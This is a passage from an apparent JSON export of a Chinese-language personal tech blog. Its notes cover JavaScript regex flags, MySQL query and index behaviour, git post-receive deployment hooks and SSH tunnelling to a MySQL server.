MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/sticky)\n\n### 心裡疑惑\n\n其實我對`g`這個也滿疑惑的\n什麼是全域查詢\n平常用 sublime 或 vscode 都沒有這個搜尋選項\n\n`m`多行模式\n也讓我很疑惑，是找多行，但感覺跟`g`有關係\n可以找多筆\n\nregex 101 產生 JavaScript 語法\n`exec`怎麼可以做 while 迴圈\n\n```javascript\nconst regex = /test/gm;\nconst str = `test`;\nlet m;\n\nwhile ((m = regex.exec(str)) !== null) {\n  // This is necessary to avoid infinite loops with zero-width matches\n  if (m.index === regex.lastIndex) {\n    regex.lastIndex++;\n  }\n\n  // The result can be accessed through the `m`-variable.\n  m.forEach((match, groupIndex) => {\n    console.log(`Found match, group ${groupIndex}: ${match}`);\n  });\n}\n```\n\n### 研究結果\n\n`m`看是否需要一行一行搜尋，通常可能需要搭配`g`才能找出多行資料\n一般沒用`m`算單行模式\n從這篇來看到[正則表達式之單行模式、多行模式、區分大小寫模式 - ^小七 - 博客園](https://www.cnblogs.com/zengguowang/p/7998754.html) {% asset_link 2.png 備份圖 %}\n\n> 單行模式: (.)點號不匹配換行符，在 windows 中與[^\\r\\n]等價，並不是刻意匹配任意字符，在單行模式下會改變點號的含義，做到匹配任意字符 s\n> 多行模式: 多行模式下^和\\$的含義會被改變，普通的含義是匹配整個字符串的開頭和結尾，在多行模式下匹配的就是每一行的行首和行尾，而\\A 和\\Z 他們的含義始終是匹配整個字符串的開頭和結尾\n> 再看這個範例，可以看出差異[Multiple Strings - Regex Tester/Debugger](https://www.regextester.com/102251)\n> 簡單來說就是`^xxx$`才會看出差異\n\n`g`其實跟持續搜尋有關係(如:js)，但是 php 會用不同函式(preg_match_all,preg_match)，可以自己玩玩看 regex101\n可參考:[[ JS 进阶 ] test, exec, match, replace - kraaas 前端博客 - SegmentFault 思否](https://segmentfault.com/a/1190000003497780)\n\n```\nvar reg = /\\d/;\n//第一次匹配\nconsole.log(reg.exec('a123'));\nconsole.log(reg.lastIndex);\n//输出\n[\"1\"]\n  0\n\n第二次匹配\nconsole.log(reg.exec('a123'));\nconsole.log(reg.lastIndex);\n//输出\n[\"1\"]\n  0\n\n```\n\n```\nvar reg = /\\d/g;\n//第一次匹配\nconsole.log(reg.exec('a123'));\nconsole.log(reg.lastIndex);\n//输出\n[\"1\"]\n  2\n\n第二次匹配\nconsole.log(reg.exec('a123'));\nconsole.log(reg.lastIndex);\n//输出\n[\"2\"]\n  3\n\n第三次匹配\nconsole.log(reg.exec('a123'));\nconsole.log(reg.lastIndex);\n//输出\n[\"3\"]\n  4\n\n第四匹配\nconsole.log(reg.exec('a123'));\nconsole.log(reg.lastIndex);\n//输出\nnull\n  0\n```\n\nregex 物件有 exec,test，參數是帶 string\nstring 型態有 match，參數是帶 regex\n\n要注意 regex exec 跟 test 都吃`g`flag\ntest 回傳只會傳 true,false\nexec 回傳比較特殊，傳回來是一個 array\n[当设置全局标志的正则使用 test | MDN](<https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test#%E5%BD%93%E8%AE%BE%E7%BD%AE%E5%85%A8%E5%B1%80%E6%A0%87%E5%BF%97%E7%9A%84%E6%AD%A3%E5%88%99%E4%BD%BF%E7%94%A8test()>)\n感覺一不小心結果會得到不一樣的結果\n\nunicode、sticky 好像都是 ES6 東西，先暫時不研究。\n\n[正则的扩展 - ECMAScript 6 入门](http://es6.ruanyifeng.com/#docs/regex)\n[Edit fiddle - JSFiddle](http://jsfiddle.net/uq55en5o/)\n\n[[JS] RegExp 參數的正確姿勢](https://blog.hinablue.me/js-regexp-can-shu-de-zheng-que-zi-shi/) {% asset_link 1.png 備份圖 %}\n[正则表达式多行匹配及声明标识 - hongweigg 的专栏 - CSDN 博客](https://blog.csdn.net/hongweigg/article/details/39579609)\n[正则表达式之单行模式、多行模式、区分大小写模式 - ^小七 - 博客园](https://www.cnblogs.com/zengguowang/p/7998754.html)\n","tags":["regex"],"categories":["Regex"]},{"title":"MySQL不錯優化文章&DB雜記","url":"%2Fblog%2F2018%2F12%2F27%2FMySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98%2F","content":"\n小記網路看到的好文章\n\n<!--more-->\n\n## Mysql 好文\n\n[我必须得告诉大家的 MySQL 优化原理 - 简书](https://www.jianshu.com/p/d7665192aaaf) {% asset_link 1.png 備份圖 %}\n[我必须得告诉大家的 MySQL 优化原理 2 - 简书](https://www.jianshu.com/p/01b9f028d9c7) {% asset_link 2.png 備份圖 %}\n[我必须得告诉你的 MySQL 优化原理 3 - 简书](https://www.jianshu.com/p/78b6b7e2bb7f) {% asset_link 3.png 備份圖 %}\n[jobbole/awesome-mysql-cn: MySQL 资源大全中文版，分析工具、备份、性能测试、配置、部署、GUI 等](https://github.com/jobbole/awesome-mysql-cn)\n\n## Sharding\n\n[MySql 從一竅不通到入門（五）Sharding：分表、分庫、分片和分割槽 - IT 閱讀](https://www.itread01.com/content/1545726433.html)\n[MySQL Sharding 详解 - 简书](https://www.jianshu.com/p/6ebafabfddae)\n[MongoDB Sharding 分散式儲存架構建置 (概念篇) - Soul & Shell Blog](https://blog.toright.com/posts/4552/mongodb-sharding-%E5%88%86%E6%95%A3%E5%BC%8F%E5%84%B2%E5%AD%98%E6%9E%B6%E6%A7%8B%E5%BB%BA%E7%BD%AE-%E6%A6%82%E5%BF%B5%E7%AF%87.html/amp)\n\n### mariadb sipder(mysql sharding)\n\n- [Spider 引擎分布式数据库解决方案（最全的 spider 教程） - 简书](https://www.jianshu.com/p/b96a8c90689a) {% asset_link 4.png 備份圖 %}\n- [aipescience/spider-docker: Docker files for a Spider-Engine MariaDB cluster](https://github.com/aipescience/spider-docker)\n- [MySQL 原生的分库分表方案 - Spider 存储引擎 - 知乎](https://zhuanlan.zhihu.com/p/47418626)\n- [MySQL 存储引擎之 Spider 内核深度解析-云栖社区-阿里云](https://yq.aliyun.com/articles/80458)\n- [MySQL 中间件 Spider 引擎问题集锦 - 简书](https://www.jianshu.com/p/efb31df1119c)\n\n這邊我有自已用[aipescience/spider-docker: Docker files for a Spider-Engine MariaDB cluster](https://github.com/aipescience/spider-docker)\n做一個簡單環境\n再搭配了[Spider 引擎分布式数据库解决方案（最全的 spider 教程） - 简书](https://www.jianshu.com/p/b96a8c90689a)教學做出一個 Sipder 環境\n使用結論：在使用 Sipder 做 alter table 時候，後面的 DB 不會跟著改變\n必須各別調整，在管理上面感覺不會非常方便\n不知道是不是有很好用的部屬工具可以解決?\n\n[Cluster 和 HA 的差別](https://millenniummeetonce.blogspot.com/2015/12/clusterha.html)\n[Server NLB 和 Cluster 架構 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10087065)\n\n## binlog\n\n- [初探 MySQL 的 Binlog · 一个伪宅级别的码畜。](https://xcoder.in/2015/08/10/mysql-binlog-try/)\n- [MySQL 使用 binary log 回復 某段時間區間 的資料 | Tsung's Blog](https://blog.longwin.com.tw/2009/04/mysql-binlog-recovery-range-by-date-time-2009/)\n- [腾讯工程师带你深入解析 MySQL binlog - 知乎](https://zhuanlan.zhihu.com/p/33504555)\n- [adalf 的小技巧: [MySQL]查看 Binlog 的內容](http://adalf0722.blogspot.com/2014/11/mysqlbinlog.html)\n\n## RabbitMQ kafka\n\n[Kafka、RabbitMQ、RocketMQ 之间的区别是什么 ? - 知乎](https://www.zhihu.com/question/275090117)\n[消息中间件部署及比较：rabbitMQ、activeMQ、zeroMQ、rocketMQ、Kafka、redis - 掘金](https://juejin.im/post/5b32044ef265da59654c3027)\n\n### kafka\n\n- [使用 Docker 快速搭建 Kafka 开发环境 | Tomoya's Blog](https://tomoyadeng.github.io/blog/2018/06/02/kafka-cluster-in-docker/)\n- [Kafka 深度解析 | 技术世界 | kafka,大数据,集群,kafka 架构,技术世界,郭俊 Jason,大数据架构,Kafka HA,kafka benchmark,kafka split brain,kafka 脑裂](http://www.jasongj.com/2015/01/02/Kafka%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/index.html)\n- [在 Docker 上运行 Apache Kafka - DockOne.io](http://dockone.io/article/565)\n- [[Day06] Kaggle 的解題挑戰 - Kafka 實作 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10192284)\n","tags":["mysql"],"categories":["MySQL"]},{"title":"mysql date和date_format小記","url":"%2Fblog%2F2018%2F12%2F24%2Fmysql-date%E5%92%8Cdate-format%E5%B0%8F%E8%A8%98%2F","content":"\n平常我都是用 date()\n但今天看到程式使用 date_format()\n好奇這兩個差異\n\n<!--more-->\n\n其實下面兩個都可以顯示時間\n參數第一個不管用 date,datetime 都不會有錯誤問題\n[sql - How to optimize mysql group by with DATE_FORMAT - Stack Overflow](https://stackoverflow.com/questions/50939499/how-to-optimize-mysql-group-by-with-date-format)\n效能上其實兩者沒太大差別(如上連結)\n\n```sql\nselect date_format( '2018-01-32 00:00:00' + INTERVAL 1 DAY,'%Y%-%m-%d');\n```\n\n```sql\nselect date( '2018-01-32 00:00:00');\n```\n\n之後有發現甚麼在來記錄\n\n參考連結\n\n- [MySQL Date Format: What Datatype Should You Use? We Compare Datetime, Timestamp and INT.](https://www.vertabelo.com/blog/technical-articles/what-datatype-should-you-use-to-represent-time-in-mysql-we-compare-datetime-timestamp-and-int)\n- [Re: [SQL ] mysql date column index 問題 - 看板 Database - 批踢踢實業坊](https://www.ptt.cc/bbs/Database/M.1379428749.A.7E8.html)\n- [mysql date comparison with date_format - Stack Overflow](https://stackoverflow.com/questions/13507642/mysql-date-comparison-with-date-format)\n- [MySQL :: MySQL 8.0 Reference Manual :: 12.7 Date and Time Functions](https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_date)\n- [MySQL :: MySQL 5.5 Reference Manual :: 9.1.3 Date and Time Literals](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-literals.html)\n- [mysql 日期与 date*format 的比较\\_date*帮酷编程问答](http://hant.ask.helplib.com/mysql/post_2073079)\n- [(MySQL) | Online editor and compiler](https://paiza.io/projects/e0Vw8A5Q4qB1Wa9HZtvzjA?language=mysql)\n- [mysql 时间字段性能比较 - u011820505的博客 - CSDN博客](https://blog.csdn.net/u011820505/article/details/79756652)","tags":["mysql"],"categories":["MySQL"]},{"title":"終於知道為什麼子查詢沒辦法抓取外面的表","url":"%2Fblog%2F2018%2F12%2F24%2F%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8%2F","content":"\n今天終於找到我以前下子查詢沒辦法抓到外面的表原因\n\n> 這兩個其實不難分，不要被兩個專有名詞嚇到\n> 先講非相關子查詢，簡單講就是子查詢跟外面 SQL 查詢內容沒有相關\n> 非相關子查詢只會跑一次，所以效能上會非常快\n> 執行順序也比外層先，所以這也是為什麼非相關子查詢沒法取得外層欄位的原因\n\n[SQL 子查詢筆記(相關子查詢/非相關子查詢) | 程式狂想筆記](https://malagege.github.io/blog/2017/12/23/logdown/2017-12-23-sql-subquery-notes/)\n\n<!--more-->\n\n## 其實子查詢 JOIN 沒辦法抓到外面的表\n\n{% asset_img 1.png 放在join不能查詢 %}\n\n放在 select 跟 where 都可以查\n\n```sql\nSELECT (\n    SELECT b.uid\n    FROM `xxxxxxxx` b\n    where b.`date` = a.`date` and b.uid  = a.uid\n) as a\nFROM `xxxxxxxx` a\nwhere `date` = '2017-12-01' and uid  = '2239124893975610'\n```\n\n之前也有寫過這篇\n[SQL ON /WHERE 差別 | 程式狂想筆記](https://malagege.github.io/blog/2017/07/13/logdown/2017-07-13-2043738/)\n\n希望以後寫子查詢可以順順利利\n","tags":["子查詢"],"categories":["MySQL"]},{"title":"date在查詢大量資料沒吃到index","url":"%2Fblog%2F2018%2F12%2F24%2Fdate%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index%2F","content":"\n最近做時間查詢一個月資料\n但是盡然沒有吃到 index\n我抓一天、兩天資料都有吃到\n抓到超過 20 天竟然就吃不到\n覺得這個問題好像滿嚴重\n\n<!--more-->\n\n## 大量資料吃 index 未必是壞事\n\n記得之前去聽一個研討會\n當欄位資料別少的時候(姓別：男、女)\n但大量資料，資料分散造成讀取不是連續的\n會造今資料不會很快\n所以這時候 full scan 不是壞事\n\n但今過爬文找到[Re: [SQL ] mysql date column index 問題 - 看板 Database - 批踢踢實業坊](https://www.ptt.cc/bbs/Database/M.1379428749.A.7E8.html)\n\n```\n首先你要知道 INDEX 是另外存的 也佔空間 也吃 FILE IO\n也就是說 透過 INDEX 其實不一定比較快\n例如你有一個 TABLE 總共佔了 10000 個 block\n然後建了一個 index , 這個 index 本身佔了 2000 個 block\n假設你今天要找的資料 在整個 table 的 10000 個 blocks 裡，\n散布在其中的 9000 個 blocks 裡面。\n\n這時候  你透過 index 找資料的 IO 成本就會是 2000 + 9000 = 11000\n而 Full Table Scan 的 IO 成本只有 10000\n像這樣的時候， DBMS 就會選擇直接做 Table Scan 因為成本比較低。\n那 DBMS 怎麼知道哪條路成本比較低呢\n就來自它本身對這些 表格/索引 的統計值\n\n以 Oracle 舉例  跟這樣行為有關的參數就包括有\n1. 最佳化器嘗試組出最佳路徑的嘗試次數上限\n2. 最佳化器判斷 走 index 的成本 大於 Full Table Scan 成本的多少比例以上\n   就走 Full Scan\n3. 最佳化器優化的方向(最小IO , 最快回應等\n回到你提的問題\n從你下的參數中我們可以注意到幾件事\n\n\n1. 在你指定的範圍內資料量較小的時候 DBMS 會覺得該走 index\n\n2. 在你指定的範圍內資料量較大的時候 DBMS 選擇走 FULL SCAN\n\n3. 你下了 select * 這代表所有不在INDEX上的欄位，DBMS都必須要翻\n   DATA BLOCKS出來才能拿到資料\n\n但是在你的資料中  0000-00-00  的資料量到底有多少？\n\n如果只有很小一點點 (或是 DBMS 覺得它只佔一點點\n\n那麼使用 FULL SCAN 是很正常的。\n\n反正你都得翻這些資料出來，何必脫褲子放屁去 index blocks 再繞一圈呢？\n\n\n但是如果 這樣的資料是佔多數的\n\n那或許是你的表格/索引的統計值出問題了。導致 DBMS 覺得這樣比較快\n\n\n* 有另一個狀況 就是  DBMS 在處理 function(col) 這些操作的時候\n  因為存在 index 裡的資料是 col 而非 function(col)\n  所以 DBMS 會覺得這個 index 是與需求不符的 會放棄\n\n** 然後 資料量大的話 會慢是正常的啊 有吃 IO 吃CPU 就有開銷就是要花工夫啊\n   你只能避免它繞冤枉路 該走的路還是免不了的\n\n```\n\n其實 MySQL 被評效能不好，不過看樣子是 DB 選擇最佳方案\n看到這個就讓他放手去做 full scan\n不然就做大數據 XD(其實我不會)\n\n{% asset_img 1.jpg  %}\n{% asset_img 2.jpg  %}\n\n## 強制做 index 查詢\n\n```\nselect count(*) from http_log_3 force index(time) where time >= 000000\n```\n\n**注意** 這邊的 index(`index名字`)\n如我上面圖片要寫成 : force index(`idx_date`)\n\n這邊有範例[通過 force index 了解的 MySQL 查詢的性能優化 | 不分享空間](https://et3w503.wordpress.com/2008/12/02/%E9%80%9A%E9%81%8Eforce-index%E4%BA%86%E8%A7%A3%E7%9A%84mysql%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%80%A7%E8%83%BD%E5%84%AA%E5%8C%96/)\n可以看到跑出來結果差很多\n所以我們還是要相信 MySQL XDD\n\n[Mysql 的强制索引（Force Index）都为我们做了哪些优化？ - 愿今日的一切困难在未来都不值一提 - ITeye 博客](https://jef.iteye.com/blog/386907)\n\n其他問題小記\n[老天尊的死期: MySQL 常見問題](http://carlislebear.blogspot.com/2013/06/mysql.html)\n[mysql 的 process 堵塞处理 | Sayue's Blog](https://sayue.me/2017/06/11/mysql%E7%9A%84process%E5%A0%B5%E5%A1%9E%E5%A4%84%E7%90%86/)\n","tags":["index"],"categories":["MySQL"]},{"title":"MySQL count 和 Like 查詢大小寫問題小記","url":"%2Fblog%2F2018%2F12%2F19%2FMySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98%2F","content":"\nMySQL最近做`count`時候\n發現有一個寫法很特別\n特別記錄一下\n\n另外MySQL `like`查詢預設不分大小寫\n其他DB我記得預設會分大小寫\n不常寫應該很容易忘記\n\n<!--more-->\n\n## DB  LIKE到底有沒有分大小寫呢?\n\nMySQL , SQL Server沒有分\nOracle,DB2有分\n\n> 要讓mysql查詢區分大小寫，可以：\n    select * from table_name where binary a like 'a%'\n[MySQL 的 LIKE 查詢區分大小寫 | InspireGate 派克空間](http://inspiregate.com/programming/mysql/363-mysql-like-queries-are-case-sensitive.html)\n\n* [SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 ::](http://lanfar.pixnet.net/blog/post/40706817-sql%EF%BC%9Aselect%E8%8B%B1%E6%95%B8%E5%AD%97%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E3%80%81%E4%B8%8D%E5%88%86%E5%85%A8%E5%8D%8A%E5%BD%A2%E3%80%81%E5%BF%BD)\n\n[sql - How do you force mysql LIKE to be case sensitive? - Stack Overflow](https://stackoverflow.com/questions/14007450/how-do-you-force-mysql-like-to-be-case-sensitive)\n\n[Java程式教學甘仔店: Oracle SQL LIKE的用法教學](http://pclevin.blogspot.com/2014/05/oracle-sql-like.html)\n\n\n## count \n\n今天問比較資深工程師會怎麼用\n他說他會用`count(1)`\n不過仔細查看了一下\n`count(欄位)`是我平常使用的方法，我知道當`null`時候不會算進去\n`count(1)`會算`null`值\n\n\n```\n执行效果上：  \ncount(*)包括了所有的列，相当于行数，在统计结果的时候，不会忽略列值为NULL  \ncount(1)包括了忽略所有列，用1代表代码行，在统计结果的时候，不会忽略列值为NULL  \ncount(列名)只包括列名那一列，在统计结果的时候，会忽略列值为空（这里的空不是只空字符串或者0，而是表示null）的计数，即某个字段值为NULL时，不统计。\n--------------------- \n作者：BigoSprite \n来源：CSDN \n原文：https://blog.csdn.net/iFuMI/article/details/77920767 \n版权声明：本文为博主原创文章，转载请附上博文链接！\n```\n[count(1)、count(*)与count(列名)的执行区别 - iFuMI的博客 - CSDN博客](https://blog.csdn.net/iFuMI/article/details/77920767)\n{% asset_link web1.png 備份圖 %}\n[Select Count(*) / Count(1) / Count(欄位名) 的差異 | Jeff 隨手記 - 點部落](https://dotblogs.com.tw/jeff-yeh/2011/01/12/20767)\n\n\n\n最近太忙了，因為還沒有時間消化\n所以先放在這邊\n\n* [Fake2db - もっともらしいダミーデータを作る事ができるPythonツール | ソフトアンテナブログ](https://www.softantenna.com/wp/software/fake2db/)\n* [bhrgu/fake2db-tests: Several tests for the fake2db project](https://github.com/bhrgu/fake2db-tests)\n* [MySQL-如何刪除hash表分區 - 掃文資訊](https://hk.saowen.com/a/f3d3f46df39716db1ddd1a69d38c07a9e92b5793e5b745b6f5c0e64e07b9056c)\n* [MYSQL的分区字段，必须包含在主键字段内 - 王 庆 - 博客园](https://www.cnblogs.com/zhishan/p/3285055.html)\n* [mysql 的 partition与key的关系、限制 - barfoo的专栏 - CSDN博客](https://blog.csdn.net/barfoo/article/details/4242863)\n* [mysql 表分區技術 - 掃文資訊](https://hk.saowen.com/a/8354a112014a1c52bfd80f3d81b1ae06d2b2d59b1bc1fd71f57f5e614f42580c)\n* [［MySQL］MySQL分区与传统的分库分表 - 海天的笔记本 | haitian-coder](http://haitian299.github.io/2016/05/26/mysql-partitioning/)\n* [MySQL Partitioning a VARCHAR(60) - Stack Overflow](https://stackoverflow.com/questions/47423873/mysql-partitioning-a-varchar60)\n* [聊聊partition的方式 - code-craft - SegmentFault 思否](https://segmentfault.com/a/1190000011704687)\n* [MySQL分区总结 - iVictor - 博客园](https://www.cnblogs.com/ivictor/p/5033708.html)\n* [Orcale搜尋資料且不分大小寫 @ 這是林葛格的窩 :: 隨意窩 Xuite日誌](https://blog.xuite.net/superman23.lin/twblog/155325150-Orcale%E6%90%9C%E5%B0%8B%E8%B3%87%E6%96%99%E4%B8%94%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB)\n* [SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 ::](http://lanfar.pixnet.net/blog/post/40706817-sql%EF%BC%9Aselect%E8%8B%B1%E6%95%B8%E5%AD%97%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E3%80%81%E4%B8%8D%E5%88%86%E5%85%A8%E5%8D%8A%E5%BD%A2%E3%80%81%E5%BF%BD)\n* [Select Count(*) / Count(1) / Count(欄位名) 的差異 | Jeff 隨手記 - 點部落](https://dotblogs.com.tw/jeff-yeh/2011/01/12/20767)\n* [count(1)、count(*)与count(列名)的执行区别 - iFuMI的博客 - CSDN博客](https://blog.csdn.net/iFuMI/article/details/77920767)\n* [20萬筆資料，Mysql資料庫就跑不動囉! (排序相關)](https://www.puritys.me/docs-blog/article-17-20%E8%90%AC%E7%AD%86%E8%B3%87%E6%96%99%EF%BC%8CMysql%E8%B3%87%E6%96%99%E5%BA%AB%E5%B0%B1%E8%B7%91%E4%B8%8D%E5%8B%95%E5%9B%89!-(%E6%8E%92%E5%BA%8F%E7%9B%B8%E9%97%9C).html)\n* [linux - How to do the port forwarding from one ip to another ip in same network? - Server Fault](https://serverfault.com/questions/586486/how-to-do-the-port-forwarding-from-one-ip-to-another-ip-in-same-network)\n* [15個優化你的sql Query的方式 | Davidou的 Blog](http://blog.davidou.org/archives/609)\n* [Undefined index php - Google 搜尋](https://www.google.com/search?client=firefox-b-ab&q=Undefined+index+php)\n* [網站設計筆記: PHP Notice: undefined index 完美解决方法](http://alfredwebdesign.blogspot.com/2013/05/php-notice-undefined-index.html)\n* [[解決] PHP Notice: Undefined index和Undefined variable的解决方法 « 關於網路那些事...](https://adon988.logdown.com/posts/4701973)\n* [對 MySQL 的 VARCHAR 欄位使用 INDEX 時可以增加效率的方法… – Gea-Suan Lin's BLOG](https://blog.gslin.org/archives/2012/07/17/2911/%E5%B0%8D-mysql-%E7%9A%84-varchar-%E6%AC%84%E4%BD%8D%E4%BD%BF%E7%94%A8-index-%E6%99%82%E5%8F%AF%E4%BB%A5%E5%A2%9E%E5%8A%A0%E6%95%88%E7%8E%87%E7%9A%84%E6%96%B9%E6%B3%95/)\n* [SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 ::](http://lanfar.pixnet.net/blog/post/40706817-sql%EF%BC%9Aselect%E8%8B%B1%E6%95%B8%E5%AD%97%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E3%80%81%E4%B8%8D%E5%88%86%E5%85%A8%E5%8D%8A%E5%BD%A2%E3%80%81%E5%BF%BD)\n* [MySQL 的 LIKE 查詢區分大小寫 | InspireGate 派克空間](http://inspiregate.com/programming/mysql/363-mysql-like-queries-are-case-sensitive.html)\n* [为什么oracle区分大小写？_oracle_帮酷编程问答](http://hant.ask.helplib.com/oracle/post_706515)\n* [sql - How do you force mysql LIKE to be case sensitive? - Stack Overflow](https://stackoverflow.com/questions/14007450/how-do-you-force-mysql-like-to-be-case-sensitive)\n* [SQL Fiddle](http://sqlfiddle.com/#!15/9314a/16)\n* [Like Case Sensitive in MySQL - Stack Overflow](https://stackoverflow.com/questions/8083455/like-case-sensitive-in-mysql)\n* [postgresql like case insensitive - Google 搜尋](https://www.google.com/search?client=firefox-b-ab&q=postgresql+like+case+insensitive&spell=1&sa=X&ved=0ahUKEwi8-LWd-qvfAhWKvbwKHWR6C-kQBQgpKAA&biw=1920&bih=966)\n* [MySQL 裡搜尋 CHAR/VARCHAR (String) 欄位時要注意的事情 – Gea-Suan Lin's BLOG](https://blog.gslin.org/archives/2014/02/09/4237/mysql-%E8%A3%A1%E6%90%9C%E5%B0%8B-charvarchar-string-%E6%AC%84%E4%BD%8D%E6%99%82%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/)","tags":["like"],"categories":["MySQL"]},{"title":"git push簡單自動部屬程式方法","url":"%2Fblog%2F2018%2F12%2F15%2Fgit-push%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E9%83%A8%E5%B1%AC%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95%2F","content":"\n其實最近想git有甚麼好方法做部屬動作\n蒐集網路一些方法\n都是`delete all file`再刪除....\n但感覺這種作法，會讓服務中斷\n有想到用`git pull`更新方法\n但Server Web目錄會有git\n雖然有想到用git方法\n不過最終有找到不錯的做法\n\n<!--more-->\n\n## Git 如何針對其他路徑下的 Repository 執行指令\n\n最近剛好看到這篇\n`git -–git-dir={專案路徑}.git\\ -–work-tree={專案路徑} {git 指令}`\n看到這個舊感覺能用在git簡單部屬上面\n\n所以就稍微在我Linux電腦主機上面玩了一下\n\n簡單原理`git-dir`運用在git 資料夾，這邊範例是`.git`結尾\n我一開始以為一定要用`bare`\n但後來發現，除了可以用`bare`當git\n還能用一般`project_dir/.git/`\n\nwork-tree 就是要對應其路徑\n\n\n看到這個就能感覺輕鬆部屬\n.git/hooks/post-receive\n```bash\n# !/bin/sh\n\n# checkout HEAD\ngit --get-dir=xxxxx/.git/ --work-tree=xxxx(部屬位置) checkout -f\n\n```\n```bash\nchmod +x .git/hooks/post-receive\n```\n[How to deploy projects with Git - Buddy](https://buddy.works/blog/how-deploy-projects-with-git)\n雖然感覺也是能用`git reset --hard head`\n不過網路上用這個比較多\n也有看到做之前`git checkout -f`做`git stash`\n雖然這篇是透過push git repo去做更新\n\n但我覺得不應該讓bare有兩個\n改天push錯就GG  XD\n\n之前也有研究[用caddy-git使用webhook初體驗 | 程式狂想筆記](https://malagege.github.io/blog/2017/11/26/logdown/2017-11-26-3865744/)\n感覺可以運用這個上面\n`then        command [args...]`應該就可以做`git --get-dir=xxxxx/.git/ --work-tree=xxxx(部屬位置) checkout -f`\n\n目前在想\n```\ndev_git --push-->git reop --> webhook --> caddy webhook --> git deploy\n```\n\n當然這邊只能做不需要編譯的部屬\n例如PHP應該能這樣做\n說不定哪天就有機會可以用到\n\n**2019-12-16**\n\n最近看到這篇 [Hugo 博客折腾记 - 咸鱼的小鱼塘](https://blog.zjyl1994.com/post/hugo-nginx-githook/) 有Webhook 程式\n[adnanh/webhook: webhook is a lightweight incoming webhook server to run shell commands](https://github.com/adnanh/webhook)\n簡單可以用 shell 部屬\n但我還沒測試過\n不知道同一個時間做 webhook ，會不會影響部屬?\n\n另類部屬方法\n[手摸手带你部署git服务器实现自动发布代码 - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000017527484)\n[通过Git将Hexo博客部署到服务器 - 掘金](https://juejin.im/post/5d825725f265da03c34c335d)\n上面有寫到\n\n其他參考來源:\n\n* [Git 面試題 - Git 教學 | 高見龍](https://gitbook.tw/interview)\n* [abiosoft/caddy-git: git middleware for Caddy](https://github.com/abiosoft/caddy-git)\n* [simple-php-git-deploy,使用PHP和Git自動部署代碼,下載simple-php-git-deploy的源碼_GitHub_幫酷](https://hant.helplib.com/GitHub/article_94904)\n* [从Git部署一个PHP项目到没有安装Git的服务器 - 代码日志](https://codeday.me/bug/20181205/437453.html)\n* [安全的代码部署 · php笔记 · 看云](https://www.kancloud.cn/xiak/php-node/581828)\n* [SegmentFault](https://mp.weixin.qq.com/s/qZGVdNtCJOycR_sye9az6w?)\n* [git 服务器 搭建/自动部署/远程连接 | Caoxl's Blog](http://blog.caoxl.com/2018/06/14/Git-Server-Deploy/)\n* [git hook实践心得 - 腾讯Web前端 IMWeb 团队社区 | blog | 团队博客](http://imweb.io/topic/5b13aa38d4c96b9b1b4c4e9d)\n* [git remote add with other SSH port - Stack Overflow](https://stackoverflow.com/questions/3596260/git-remote-add-with-other-ssh-port)\n* [用caddy-git使用webhook初體驗 | 程式狂想筆記](https://malagege.github.io/blog/2017/11/26/logdown/2017-11-26-3865744/)\n* [abiosoft/caddy-git: git middleware for Caddy](https://github.com/abiosoft/caddy-git)","tags":["git"],"categories":["Git"]},{"title":"ssh port forward連MySQL方法(SSH Tunnel)","url":"%2Fblog%2F2018%2F12%2F13%2Fssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95%2F","content":"\n早上看到[Backend 台灣 (Backend Tw)](https://www.facebook.com/groups/616369245163622/permalink/1498950796905458/)\n```\n傳統老人要連上production db的方法：\n...\n２　把自己電腦的public key放到這台nano machine上的authorized_keys，以便自己電腦不用每次ssh都要輸入密碼。\n３　每次要連上mysql時，先建立ssh port forwarding\nssh -L 9000:yourDBhostname:3306 smallPotato@abc.com\n４　然後，看你喜歡用phpMyAdmin也好，mysql bench也好，連線上localhost:9000，這樣子便能連線上production db\n```\n以上內容來自[Backend 台灣 (Backend Tw) Triton Ho](https://www.facebook.com/groups/616369245163622/permalink/1498950796905458/)\n\n之前有用過ssh tunnel 代理網頁來看\n但沒想到可以用在MySQL\n可能以前沒有深入理解這怎麼傳的 (>////<)\n\n<!--more-->\n\n早上看FB看到`ssh port forwarding`\n沒想到還有這種操作\n\n長期用phpmyadmin真的很痛苦\n但是用這個方法可以用workbench連到MySQL(內網)\n想說有沒有快速的方法\n\n## DBeaver\n[DBeaver Community | 